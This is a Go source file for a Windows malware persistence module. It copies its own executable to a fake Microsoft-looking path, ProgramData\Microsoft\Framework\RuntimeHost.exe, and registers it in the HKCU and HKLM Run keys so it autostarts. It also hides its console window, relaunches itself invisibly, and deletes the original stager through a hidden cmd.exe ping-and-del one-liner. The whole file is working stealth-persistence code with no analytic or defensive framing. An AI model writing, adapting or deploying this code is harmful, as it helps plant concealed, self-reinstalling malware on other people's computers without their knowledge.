//go:build windows

package persist

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	createNoWindow = 0x08000000
	installDir  = `C:\ProgramData\Microsoft\Framework`
	installName = `RuntimeHost.exe`
	runValue    = `RuntimeHost`
)

func installPath() string {
	return filepath.Join(installDir, installName)
}

func ensurePlatform() bool {
	target := installPath()
	self, err := os.Executable()
	if err != nil {
		self = os.Args[0]
	}
	self = filepath.Clean(self)
	target = filepath.Clean(target)

	if err := os.MkdirAll(installDir, 0755); err != nil {
		return false
	}

	if !pathsEqual(self, target) {
		if err := copyFile(self, target); err != nil {
			return false
		}
	}

	writeAutoRun(target)

	if pathsEqual(self, target) {
		return false
	}

	if startHidden(target) {
		deleteStagerLater(self)
		return true
	}
	return false
}

func prepareRuntimePlatform() {
	hideConsoleWindow()
}

func hideConsoleWindow() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	user32 := windows.NewLazySystemDLL("user32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

func pathsEqual(a, b string) bool {
	return strings.EqualFold(filepath.Clean(a), filepath.Clean(b))
}

func copyFile(src, dst string) error {
	in, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, in, 0755)
}

func writeAutoRun(exe string) {
	exe = filepath.Clean(exe)
	if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValue, exe)
		k.Close()
	}
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValue, exe)
		k.Close()
	}
}

func startHidden(exe string) bool {
	exe = filepath.Clean(exe)
	cmd := exec.Command(exe)
	cmd.Dir = installDir
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	return cmd.Start() == nil
}

func deleteStagerLater(path string) {
	path = filepath.Clean(path)
	inner := fmt.Sprintf(`ping 127.0.0.1 -n 3 >nul & del /f /q "%s"`, path)
	cmd := exec.Command(`cmd.exe`, `/c`, inner)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	_ = cmd.Start()
}